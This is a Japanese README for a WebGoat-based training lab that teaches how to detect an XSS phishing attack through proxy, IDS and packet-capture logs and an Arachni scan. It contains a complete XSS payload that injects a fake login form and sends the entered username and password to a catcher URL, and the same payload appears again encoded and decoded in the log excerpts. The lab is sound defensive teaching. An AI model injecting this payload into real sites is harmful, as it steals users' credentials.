# CyExcが提供するWebGoatを利用した演習について
WebGoatは、ウェブアプリケーションに対してのセキュリティの教育を目的としてOWASP (The Open Web Application Security Project) により作成されたアプリケーションである。WebGoatでは、最も重大なウェブアプリケーションリスクOWASP トップ10の脆弱性とその攻撃手法をアプリケーション上で再現できる演習環境を提供しており、学習者は演習を通して脆弱性に対しての攻撃や対策について学ぶことができる。  

CyExcが提供する本演習では、学習者に対してのセキュリティアラートの監視技法の教育を目的とし、WebGoatの環境にIDS (Intrusion Detection System) およびリバースプロキシを追加した環境を提供する。  

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/block.png" title="WebGoat演習環境構成図">

## Motivation
OWASPトップ10において、クロスサイトスクリプティング (以下、XSS) は年間2位 (2010年)、3位 (2013年)、7位 (2017年) と徐々に順位は下げてきてはいるが、発生頻度としてはトップ10の脆弱性の中で全体として二番目であり、その攻撃事象や対策について理解を深めることは非常に重要である。  

XSSのトップ10における順位が近年降下した理由としては、ウェブアプリケーションを支える技術の成熟 (PHP、J2EE/JSP、ASP.NET等) や、自動検出ツールによるXSSの脆弱性検出の技術向上などが挙げられる。  

本演習では、OWASPのWebGoatを使用し、XSSの脆弱性に対しての攻撃が実行された際のログ取得やウェブスキャナによるスキャンの実行方法について紹介する。  

## Prerequisite
* VirtualBox
  * ゲストOS: Ubuntu 14.04
  * Install: docker, docker-compose
* Vagrant
  * Plugin: landrush, vagrant-vbguest
  * Packer

## Installation
* VirtualBox
1. $ cd apps/　　　
2. $ sudo docker-compose up --build　　　　
3. Browse to ht&#8203;tp://webgoat.cyexc-target/WebGoat　　　
4. Browse to ht&#8203;tp://webgoat.cyexc-target:9292/ for arachni　　　
　　
* Vagrant　　　
1. [CyExc用box](https://github.com/CyExc/CyExc/tree/master/2017/CyExc_Box)を作成する。
2. $ vagrant up --provision　　　   
3. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
```
webgoat.cyexc-target           192.168.33.10
10.33.168.192.in-addr.arpa     webgoat.cyexc-target
```
4. $ vagrant ssh　　　   
   i. $ cd apps/  <br>
   ii.$ sudo docker-compose up --build  <br>
   iii. Browse to ht&#8203;tp://webgoat.cyexc-target/WebGoat  <br>
   iv. Browse to ht&#8203;tp://webgoat.cyexc-target:9292/ for arachni  <br>

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/network.png" title="ネットワーク図">

## XSSの脆弱性への攻撃演習
### 学習目標
XSSの脆弱性の持ったウェブページへの攻撃や、ログによる攻撃の検知方法について学習する。
### シナリオ
XSSの脆弱性を持った、検索サービスを提供するウェブサイト"target.server"がある。このtarget.serverは認証を必要とする。このウェブサイトtarget.serverの検索フィールドに｢test｣を入力し｢SUBMIT｣ボタンをクリックすると、ウェブアプリケーションサーバに以下のようなリクエストを送信するように攻撃者により設定されている。  

ie) ht&#8203;tp://target.server/searchform?Input=test&SUBMIT=Search

被害者がこのような悪意あるウェブページにアクセスし、｢検索文字列｣と共に｢スクリプトを含む有害なコード｣がtarget.serverに送信されると、被害者のウェブブラウザにtarget.serverサイトから｢検索結果｣とともに、ユーザ名とパスワードの認証情報の入力を促すページが表示される。被害者がこのページを正規のウェブサイトであることを疑わずにユーザ名とパスワードを入力してしまうと、悪意あるウェブサイトに被害者の個人情報が送信されて漏洩してしまう。
### WebGoatでの学習
｢フィッシング用ページ｣と｢情報収集サーバ｣を用意する代わりに、脆弱性サーバ(｢Phishing with XSS｣)に｢攻撃コード｣を注入し、認証を促すページを表示させる。認証のためにユーザIDとパスワードを入力し、ポップアップを表示する。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/flow.png" title="学習の流れ">

学習内容としては、｢有害スクリプト｣を含む検索用のフォームを作成する方法と、ブラウザに表示しているページから｢攻撃者の情報収集WEBサイト｣に送信する方法を取得する。

### Steps
1. ｢Phishing with XSS｣ページを開き、｢Search｣フィルドに作成した｢有害スクリプトを含む認証ページ｣を入力し、「Search｣ボタンをクリックする。   

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step1.png" title="Step 1">   

2. 表示された｢認証ページ｣にユーザIDとパスワードを入力し、送信する。   
ex)

```html
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.33.10/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step2.png" width="270" height="240" title="Step 2">   

3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    

### proxyサーバログの検知
proxyサーバのログは`vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log`で取得した。

ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvcへのGETリクエストでuserとpasswordの値が漏れていることがわかる。<br>

[18/Jan/2018:13:02:12 +0000] **"GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** HTTP/1.1" 200 0 "ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"<br>

取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/proxy.log)<br>

### IDSログの検知
IDSのログは`vagrant@www:~/apps$ cp /var/log/suricata/http.log .`で取得した。

IDSのhttpログからも、ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvcでuserとpasswordの情報が漏れていることがわかる。<br>

01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 **GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)<br>

取得したログはこちら＠[http.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/http.log)<br>

### WEBスキャナー（Arachni）の実施
どのような脆弱性がht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvcに存在するのかWEBスキャナーを実施する。<br>
*NOTE: DockerネットワークにDNSサーバを置いていないので、WebGoatのdocker IPアドレスを使ってスキャンを実施する。*<br>

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/scan.png" title="Archniスキャン">  

ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvc <span></span>に対して**Unencrypted password form**や**Clickjacking**を検出している。<br>

取得したログはこちら＠[index.html](http://htmlpreview.github.com/?https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/arachni/index.html)

### proxyサーバでHTTP通信をキャプチャ
WEBサーバのログで事象を確認する。

1. proxyサーバにログイン
```
vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
```
2. ngrepを使用してHTTP通信をキャプチャ
```
root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
```
3. proxyサーバをログアウト
4. ゲストOSでproxyサーバのcontainer IDを調べる
```
vagrant@webgoat:~/apps$ sudo docker ps
CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
```
5. 取得したngrepのログをゲストOSにコピー  <br>
```
vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
```

+ 192.168.0.100(proxyサーバ)でXMLHttpRequestを受信 <br>

``
T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
Host: webgoat.cyexc-target.
Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
X-Requested-With: XMLHttpRequest.
Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search
``

+ 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>

```
$ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input   <br>
```

+ 悪意のあるスクリプトが送られていることがわかる。    <br>

``
Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br><input+type="submit"+name="login"+value="login"+onclick="hack()"></form><br><br><HR>&SUBMIT=Search
``

+ 192.168.0.100(proxyサーバ)から192.168.0.10(WebGoat)にXMLHttpRequestを送信<br>

``
T 192.168.0.100:41064 -> 192.168.0.10:8080 [A]
POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
X-Real-IP: 192.168.33.1.
Host: webgoat.cyexc-target.
X-Requested-With: XMLHttpRequest.
Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%
``

+ 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>

```
$ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   <br>
```

+ 悪意のあるスクリプトがWebGoatに送られていることがわかる。   <br>

``
Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br%
``

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/ngrep.log)


## References
* [OWASP Top 10 2013](https://www.owasp.org/images/7/79/OWASP_Top_10_2013_JPN.pdf)
* [OWASP WebGoat Project](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)
* [OWASP ZAP Attack Proxy Project](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
* [arachini scanner](http://www.arachni-scanner.com/)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
